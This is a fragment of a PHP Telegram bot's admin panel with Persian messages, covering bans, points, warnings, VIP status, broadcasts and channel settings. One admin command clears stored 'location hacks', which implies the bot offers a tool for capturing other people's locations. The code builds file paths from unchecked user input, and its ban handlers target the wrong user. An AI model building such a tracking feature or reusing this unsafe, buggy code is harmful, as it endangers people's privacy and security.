if($infouser->status == 'creator' or $infouser->status == 'administrator'){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📝 اطلاعات شما :

🌹 نام کاربر : $info_name
🔗 یوزرنیم : @$info_user
🆔 ایدی عددی : $from_id
🔡 زبان : $info_language
🔰 ربات : ✅
🌟 ادمین بودن : ✅
",
'parse_mode'=>'HTML', 
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📝 اطلاعات شما :

🌹 نام کاربر : $info_name
🔗 یوزرنیم : @$info_user
🆔 ایدی عددی : $from_id
🔡 زبان : $info_language
🔰 ربات : ✅
🌟 ادمین بودن : ❌
",
'parse_mode'=>'HTML', 
]);
}
}
}
}
//====[ADMIN]====//
if(in_array($from_id,$admin)){
if($text == "🔙 | بازگشت به منو" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🌹 | به پنل مدیریت خوش آمدید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyPanel
]);
exit();
}
//===[پنل مدیریت]===//
elseif($text == "/panel" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🌹 | به پنل مدیریت خوش آمدید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyPanel
]);
}
elseif($text == "📊 | آمار ربات" and $tc == 'private'){
$alluser = file_get_contents("data/datahU.txt");
$alaki = explode("\n",$alluser);
$allusers = count($alaki) - 2;
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔖 | وضعیت ربات شما
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$allusers",'callback_data'=>'join'],['text'=>'آمار ربات 📊','callback_data'=>'join']],
[['text'=>"$ben",'callback_data'=>'join'],['text'=>'❌ آمار بن','callback_data'=>'join']],
[['text'=>"=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'تاریخ 📆','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'زمان ⏰','callback_data'=>'join']],
              ]
        ])
      ]);
}
elseif($text == '🔐 | کانال اول'){
$datas["step"] = "lslslalalale";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔗 | لطفا ابتدا ربات را در کانال مورد نظر ادمین کنید و سپس ایدی کانال مورد نظر را بدون @ ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "lslslalalale" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
file_put_contents("channel.txt", $text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📌 | با موفقیت تنظیم شد",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyPanel
]);
}
elseif($text == "✅ | بن" and $tc == 'private'){
$datas["step"] = "djci39f939f9en";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🆔 | ایدی عددی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "djci39f939f9en" and $tc == 'private'){ 
if(file_exists("data/$text/$text.json")){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$id = file_get_contents("data/id.txt");
$datas = json_decode(file_get_contents("data/$id/$id.json"),true);
$inv = $datas["warn"];
$datas["warn"] = "3";
$outjson = json_encode($datas,true);
file_put_contents("data/$id/$id.json",$outjson);
$newben = $ben + 1;
file_put_contents("data/ben.txt", $newben);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📌 | فرد با موفقیت بن شد",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyPanel
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ | ایدی کاربری که ارسال کردید در ربات نیست",
]);
}
}
elseif($text == "❌ | آن بن" and $tc == 'private'){
$datas["step"] = "djdkkepdpp20f";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🆔 | ایدی عددی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "djdkkepdpp20f" and $tc == 'private'){ 
if(file_exists("data/$text/$text.json")){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$id = file_get_contents("data/id.txt");
$datas = json_decode(file_get_contents("data/$id/$id.json"),true);
$inv = $datas["warn"];
$datas["warn"] = "0";
$outjson = json_encode($datas,true);
file_put_contents("data/$id/$id.json",$outjson);
$newben = $ben - 1;
file_put_contents("data/ben.txt", $newben);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📌 | فرد با موفقیت آن بن شد",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyPanel
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ | ایدی کاربری که ارسال کردید در ربات نیست",
]);
}
}
elseif($text == "📈 | افزایش امتیاز کاربر" and $tc == 'private'){
$datas["step"] = "getcoin";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🆔 | ایدی عددی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "getcoin" and is_numeric($text) and $tc == 'private'){ 
if(file_exists("data/$text/$text.json")){
$datas["step"] = "coinup";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
file_put_contents("data/id.txt",$text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔰 | تعداد امتیاز را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_markup'=>$KeyBackPanel
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ | ایدی کاربری که ارسال کردید در ربات نیست",
]);
}
}
elseif($step == "coinup" and is_numeric($text) and $tc == 'private'){ 
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$id = file_get_contents("data/id.txt");
$datas = json_decode(file_get_contents("data/$id/$id.json"),true);
$coin = $datas["coin"];
$newcoin = $coin + $text;
$datas["coin"] = $newcoin;
$outjson = json_encode($datas,true);
file_put_contents("data/$id/$id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"
🎉 | تبریک تعداد *$text* امتیاز به شما اضافه شد . . . 
 
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | با موفقیت تعداد *$text* امتیاز به کاربر `$id` اضافه شد",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyPanel
]);
}
elseif($text == "📉 | کسر امتیاز کاربر" and $tc == 'private'){
$datas["step"] = "byecoin";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🆔 | ایدی عددی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "byecoin" and is_numeric($text) and $tc == 'private'){ 
if(file_exists("data/$text/$text.json")){
$datas["step"] = "coindown";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
file_put_contents("data/id.txt",$text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔰 | تعداد امتیاز را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_markup'=>$KeyBackPanel
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ | ایدی کاربری که ارسال کردید در ربات نیست",
]);
}
}
elseif($step == "coindown" and is_numeric($text) and $tc == 'private'){ 
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$id = file_get_contents("data/id.txt");
$datas = json_decode(file_get_contents("data/$id/$id.json"),true);
$coin = $datas["coin"];
$newcoin = $coin - $text;
$datas["coin"] = $newcoin;
$outjson = json_encode($datas,true);
file_put_contents("data/$id/$id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"
🔐 | تعداد *$text* امتیاز از شما کسر شد . . .
 
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | با موفقیت تعداد *$text* امتیاز از کاربر `$id` کسر شد",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyPanel
]);
}
elseif($text == "❗️| اخطار به کاربر" and $tc == 'private'){
$datas["step"] = "getwarn";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🆔 | ایدی عددی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "getwarn" and is_numeric($text) and $tc == 'private'){ 
if(file_exists("data/$text/$text.json")){
$datas["step"] = "warnup";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
file_put_contents("data/id.txt",$text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔰 | تعداد اخطار را وارد کنید",
'parse_mode'=>'MarkDown',
'reply_markup'=>$KeyBackPanel
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ | ایدی کاربری که ارسال کردید در ربات نیست",
]);
}
}
elseif($step == "warnup" and is_numeric($text) and $tc == 'private'){ 
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$id = file_get_contents("data/id.txt");
$datas = json_decode(file_get_contents("data/$id/$id.json"),true);
$warn = $datas["warn"];
$newwarn = $warn + $text;
$datas["warn"] = $newwarn;
$outjson = json_encode($datas,true);
file_put_contents("data/$id/$id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"
❗️| اوپس , تعداد *$text* اخطار به شما اضافه شد . . .
 
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | با موفقیت تعداد *$text* اخطار به کاربر `$id` اضافه شد . . .",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyPanel
]);
}
elseif($text == "❕| حذف اخطار کاربر" and $tc == 'private'){
$datas["step"] = "byewarn";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🆔 | ایدی عددی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "byewarn" and is_numeric($text) and $tc == 'private'){ 
if(file_exists("data/$text/$text.json")){
$datas["step"] = "warndown";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
file_put_contents("data/id.txt",$text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔰 | تعداد اخطار را وارد کنید",
'parse_mode'=>'MarkDown',
'reply_markup'=>$KeyBackPanel
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ | ایدی کاربری که ارسال کردید در ربات نیست",
]);
}
}
elseif($step == "warndown" and is_numeric($text) and $tc == 'private'){ 
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$id = file_get_contents("data/id.txt");
$datas = json_decode(file_get_contents("data/$id/$id.json"),true);
$warn = $datas["warn"];
$newwarn = $warn - $text;
$datas["warn"] = $newwarn;
$outjson = json_encode($datas,true);
file_put_contents("data/$id/$id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"
🎉 | تبریک تعداد *$text* اخطار از شما کم شد . . .
 
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | با موفقیت تعداد *$text* اخطار از کاربر `$id` حذف شد . . .",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyPanel
]);
}
elseif($text == "🔑 | ویژه کردن" and $tc == 'private'){
$datas["step"] = "vipshod";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🆔 | ایدی عددی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "vipshod" and is_numeric($text) and $tc == 'private'){ 
if(file_exists("data/$text/$text.json")){
$datas = json_decode(file_get_contents("data/$text/$text.json"),true);
$datas["type"] = "vip";
$outjson = json_encode($datas,true);
file_put_contents("data/$text/$text.json",$outjson);
bot('sendMessage',[
'chat_id'=>$text,
'text'=>"
🎉 | تبریک حساب کاربری شما از طرف ادمین ویژه شد . . . 
 
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | حساب کاربری `$text` با موفقیت ویژه شد ",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyPanel
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ | ایدی کاربری که ارسال کردید در ربات نیست",
]);
}
}
elseif($text == "🗑 | حذف ویژه" and $tc == 'private'){
$datas["step"] = "vipnashod";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🆔 | ایدی عددی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "vipnashod" and is_numeric($text) and $tc == 'private'){ 
if(file_exists("data/$text/$text.json")){
$datas = json_decode(file_get_contents("data/$text/$text.json"),true);
$datas["type"] = free;
$outjson = json_encode($datas,true);
file_put_contents("data/$text/$text.json",$outjson);
bot('sendMessage',[
'chat_id'=>$text,
'text'=>"
❗️| حساب شما بصورت رایگان در اومد در صورت اعتراض به پشتیبانی ربات مراجعه کنید . . . 
 
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | حساب کاربری `$text` با موفقیت حذف ویژه شد . . .",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyPanel
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ | ایدی کاربری که ارسال کردید در ربات نیست",
]);
}
}
elseif($text == "🖥 | پیام به کاربر" and $tc == 'private'){
$datas["step"] = "djrofo39fowj";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🆔 | ایدی عددی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "djrofo39fowj" and $tc == 'private'){ 
if(file_exists("data/$text/$text.json")){
$datas["step"] = "djoepfp299wb";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
file_put_contents("data/id.txt",$text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔰 | متن پیام خود را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_markup'=>$KeyBackPanel
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ | ایدی کاربری که ارسال کردید در ربات نیست",
]);
}
}
elseif($step == "djoepfp299wb" and $tc == 'private'){ 
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$id = file_get_contents("data/id.txt");
$datas = json_decode(file_get_contents("data/$id/$id.json"),true);
$outjson = json_encode($datas,true);
file_put_contents("data/$id/$id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"
🎈 یک پیام از پشتیبانی دارید . . . 

📨 پیام : `$text`
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📌 | با موفقیت ارسال شد",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyPanel
]);
}
elseif($text == '🔐 | کانال دوم'){
$datas["step"] = "dkdkldllclalx";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔗 | لطفا ابتدا ربات را در کانال مورد نظر ادمین کنید و سپس ایدی کانال مورد نظر را بدون @ ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "dkdkldllclalx" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
file_put_contents("channel2.txt", $text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📌 | با موفقیت تنظیم شد",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyPanel
]);
}
elseif($text == '🔆 | متن استارت'){
$datas["step"] = "dbjdieo9c929c";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📝 | متن مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "dbjdieo9c929c" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
file_put_contents("start.txt",$text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📌 | با موفقیت تنظیم شد",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyPanel
]);
}
elseif($text == '📚 | متن راهنما'){
$datas["step"] = "dhjekfkkeodo3";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔰 | متن مورد نظر را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "dhjekfkkeodo3" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
file_put_contents("help.txt",$text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📌 | با موفقیت تنظیم شد",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyPanel
]);
}
elseif($text == "💤 | خاموش" and $tc == 'private'){
file_put_contents("onof.txt","off");
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"💤 | ربات با موفقیت خاموش شد",
]);
}
elseif($text == "⏺ | روشن" and $tc == 'private'){
file_put_contents("onof.txt","on");
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"⏺ | ربات با موفقیت روشن شد",
]);
}
elseif($text == "🔰 | پیام همگانی" and $tc == 'private'){
$datas["step"] = "djdkkskxkksmdn";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔰 | متن پیام خود را ارسال کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "djdkkskxkksmdn" and $tc == 'private'){ 
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | درحال ارسال پیام همگانی برای تمام کاربران . . . !",
'reply_markup'=>$keyPanel
]);
$get = json_decode(file_get_contents('send.json'),true);
$get['type'] = "send";
$get['text'] = "$text";
$get['msgid'] = "$message_id";
$get['count'] = "0";
$get['chat_id'] = "$chat_id";
file_put_contents('send.json',json_encode($get));
exec('php send.php');
}
elseif($text == "⚜ | فوروارد همگانی" and $tc == 'private'){
$datas["step"] = "dbdjkskxmax";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔰 | متن پیام خود را فوروارد کنید",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "dbdjkskxmax" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | درحال ارسال فوروارد همگانی به تمام کاربران . . . !",
'reply_markup'=>$keyPanel
]);
$get = json_decode(file_get_contents('send.json'),true);
$get['type'] = "forward";
$get['msgid'] = "$message_id";
$get['count'] = "0";
$get['chat_id'] = "$chat_id";
file_put_contents('send.json',json_encode($get));
exec('php send.php');
}
elseif($text == "🗑 | حذف هک لوکیشن ها" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
DeleteFolder("../location");
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🗑 | تمام هک لوکیشن ها با موفقیت حذف شدند . . .",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($text == "🎁 | امتیاز همگانی" and $tc == 'private'){
$datas["step"] = "coinToAll";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔰 | تعداد امتیاز جهت امتیاز همگانی به تمام کاربران را ارسال کنید  . . .",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$KeyBackPanel
]);
}
elseif($step == "coinToAll" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$all_member = file_get_contents("data/datahU.txt");
$ex = explode("\n",$all_member);
$cplug = count($ex) - 2;
for($n=0; $n<=$cplug; $n++){
$user = $ex[$n];
$gfgfgfgf = json_decode(file_get_contents("data/$user/$user.json"),true);
$inv = $gfgfgfgf["coin"];
$newin = $inv + $text;
$gfgfgfgf["coin"] = "$newin";
$fvdsfvdsfv = json_encode($gfgfgfgf,true);
file_put_contents("data/$user/$user.json",$fvdsfvdsfv);
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | با موفقیت تعداد *$text* امتیاز به همه کاربران اضافه شد ",
'parse_mode'=>'MarkDown'
]);
}
elseif($text == "✔️ | بستن چت گروهی" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"✅ | چت گروهی با موفقیت بسته شد !",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyPanel
]);
$all_member = fopen("ChatRoom.txt", "r");
while(!feof( $all_member)){
$user = fgets( $all_member);
bot('sendMessage',[
'chat_id'=>$user,
'text'=>"
✔️ | چت گروهی از طرف ادمین بسته شد !
",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyback
]);
}
unlink("ChatRoom.txt");
}
}
if(file_exists("error_log")) unlink("error_log");
?>